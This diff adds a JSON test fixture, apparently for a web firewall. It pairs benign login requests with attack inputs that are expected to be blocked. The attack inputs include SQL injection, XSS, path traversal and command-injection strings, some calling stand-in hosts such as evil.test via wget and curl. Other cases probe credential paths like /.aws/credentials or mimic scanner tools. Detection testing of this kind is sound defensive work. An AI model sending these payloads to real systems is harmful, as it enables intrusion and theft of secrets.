@@ -1,0 +1,453 @@
+[
+  {
+    "id": "benign-login-1",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "username": "alice", "password": "safePassword123" },
+    "expectedSource": ["AI_ENGINE", "UNKNOWN"],
+    "expectedBlocked": false
+  },
+  {
+    "id": "benign-login-2",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "username": "bob", "password": "normal-pass" },
+    "expectedSource": ["AI_ENGINE", "UNKNOWN"],
+    "expectedBlocked": false
+  },
+  {
+    "id": "benign-home-get",
+    "method": "GET",
+    "path": "/",
+    "payload": {},
+    "expectedSource": ["AI_ENGINE", "UNKNOWN"],
+    "expectedBlocked": false
+  },
+  {
+    "id": "sqli-basic-1",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "username": "admin' OR 1=1 --", "password": "x" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "sqli-basic-2",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "username": "' UNION SELECT password FROM users --", "password": "x" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "sqli-time-based",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "username": "admin' OR SLEEP(5)--", "password": "x" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "sqli-information-schema",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "q": "SELECT * FROM information_schema.tables" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "xss-script-tag",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "comment": "<script>alert(1)</script>" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "xss-svg-onload",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "comment": "<svg onload=alert(1)>" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "xss-javascript-url",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "url": "javascript:alert(1)" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "path-traversal-1",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "file": "../../etc/passwd" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "path-traversal-2",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "file": "..\\..\\windows\\win.ini" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "path-traversal-encoded",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "file": "%252e%252e%252fetc%252fpasswd" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "cmd-injection-1",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "name": "test; cat /etc/passwd" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "cmd-injection-2",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "name": "x && wget http://evil.test" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "cmd-injection-3",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "name": "x || powershell -nop" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "scanner-path-env",
+    "method": "GET",
+    "path": "/.env",
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "scanner-path-git",
+    "method": "GET",
+    "path": "/.git/config",
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "scanner-path-wp-admin",
+    "method": "GET",
+    "path": "/wp-admin",
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "scanner-path-phpmyadmin",
+    "method": "GET",
+    "path": "/phpmyadmin",
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "scanner-path-server-status",
+    "method": "GET",
+    "path": "/server-status",
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-sqlmap",
+    "method": "POST",
+    "path": "/login",
+    "headers": { "User-Agent": "sqlmap/1.8" },
+    "payload": { "username": "a", "password": "b" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-hydra",
+    "method": "POST",
+    "path": "/login",
+    "headers": { "User-Agent": "hydra" },
+    "payload": { "username": "a", "password": "b" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-ffuf",
+    "method": "GET",
+    "path": "/",
+    "headers": { "User-Agent": "ffuf/2.1" },
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-wfuzz",
+    "method": "GET",
+    "path": "/",
+    "headers": { "User-Agent": "wfuzz" },
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-gobuster",
+    "method": "GET",
+    "path": "/",
+    "headers": { "User-Agent": "gobuster" },
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-dirbuster",
+    "method": "GET",
+    "path": "/",
+    "headers": { "User-Agent": "dirbuster" },
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-nmap",
+    "method": "GET",
+    "path": "/",
+    "headers": { "User-Agent": "nmap" },
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-nikto",
+    "method": "GET",
+    "path": "/",
+    "headers": { "User-Agent": "nikto" },
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-masscan",
+    "method": "GET",
+    "path": "/",
+    "headers": { "User-Agent": "masscan" },
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-zgrab",
+    "method": "GET",
+    "path": "/",
+    "headers": { "User-Agent": "zgrab/0.x" },
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-python-requests",
+    "method": "POST",
+    "path": "/login",
+    "headers": { "User-Agent": "python-requests/2.31.0" },
+    "payload": { "username": "alice", "password": "x" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-go-http-client",
+    "method": "GET",
+    "path": "/",
+    "headers": { "User-Agent": "Go-http-client/1.1" },
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "json-content-type-empty-body",
+    "method": "POST",
+    "path": "/login",
+    "headers": { "Content-Type": "application/json" },
+    "payload": {},
+    "expectedSource": ["STATIC_RULE", "AI_ENGINE"],
+    "expectedBlocked": true
+  },
+  {
+    "id": "bot-burst-login-95",
+    "method": "POST",
+    "path": "/login",
+    "repeat": 95,
+    "payload": { "username": "burstUser", "password": "burstPass" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "bot-burst-home-100",
+    "method": "GET",
+    "path": "/",
+    "repeat": 100,
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "encoded-sqli-double",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "q": "%2555%254e%2549%254f%254e%2520SELECT" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "encoded-traversal-double",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "path": "%252e%252e%252f%252e%252e%252fetc%252fpasswd" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "xss-obfuscated-alert",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "comment": "<img src=x onerror=alert(1)>" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "command-subshell",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "cmd": "$(curl http://evil.local/ping)" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "recon-actuator",
+    "method": "GET",
+    "path": "/actuator",
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "recon-aws-creds",
+    "method": "GET",
+    "path": "/.aws/credentials",
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "mixed-benign-1",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "username": "customer01", "password": "mypassword" },
+    "expectedSource": ["AI_ENGINE", "UNKNOWN"],
+    "expectedBlocked": false
+  },
+  {
+    "id": "mixed-benign-2",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "username": "john.doe", "password": "password-1234" },
+    "expectedSource": ["AI_ENGINE", "UNKNOWN"],
+    "expectedBlocked": false
+  },
+  {
+    "id": "mixed-benign-3",
+    "method": "GET",
+    "path": "/",
+    "payload": {},
+    "expectedSource": ["AI_ENGINE", "UNKNOWN"],
+    "expectedBlocked": false
+  },
+  {
+    "id": "mixed-benign-4",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "username": "hello", "password": "world" },
+    "expectedSource": ["AI_ENGINE", "UNKNOWN"],
+    "expectedBlocked": false
+  },
+  {
+    "id": "mixed-benign-5",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "username": "mayan", "password": "secure-pass" },
+    "expectedSource": ["AI_ENGINE", "UNKNOWN"],
+    "expectedBlocked": false
+  },
+  {
+    "id": "suspicious-high-entropy-1",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "blob": "X9$!@#kLmN0pQrStUvWxYz1234567890+=/+=/+=/+=/+=/" },
+    "expectedSource": ["AI_ENGINE", "STATIC_RULE"],
+    "expectedBlocked": null
+  },
+  {
+    "id": "suspicious-high-entropy-2",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "blob": "AAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCDDDDDDDD" },
+    "expectedSource": ["AI_ENGINE", "STATIC_RULE"],
+    "expectedBlocked": null
+  },
+  {
+    "id": "suspicious-long-specials",
+    "method": "POST",
+    "path": "/login",
+    "payload": { "text": "!!!!@@@@####$$$$%%%%^^^^&&&&****(((( ))));;;;::::" },
+    "expectedSource": ["AI_ENGINE", "STATIC_RULE"],
+    "expectedBlocked": null
+  },
+  {
+    "id": "ua-sqlmap-plus-sqli",
+    "method": "POST",
+    "path": "/login",
+    "headers": { "User-Agent": "sqlmap" },
+    "payload": { "username": "admin' OR 1=1 --", "password": "x" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "ua-hydra-bruteforce-repeat",
+    "method": "POST",
+    "path": "/login",
+    "headers": { "User-Agent": "hydra" },
+    "repeat": 20,
+    "payload": { "username": "admin", "password": "guess123" },
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "scanner-path-wp-login",
+    "method": "GET",
+    "path": "/wp-login.php",
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  },
+  {
+    "id": "scanner-multi-path-burst",
+    "method": "GET",
+    "path": "/.env",
+    "repeat": 10,
+    "payload": {},
+    "expectedSource": "STATIC_RULE",
+    "expectedBlocked": true
+  }
+]
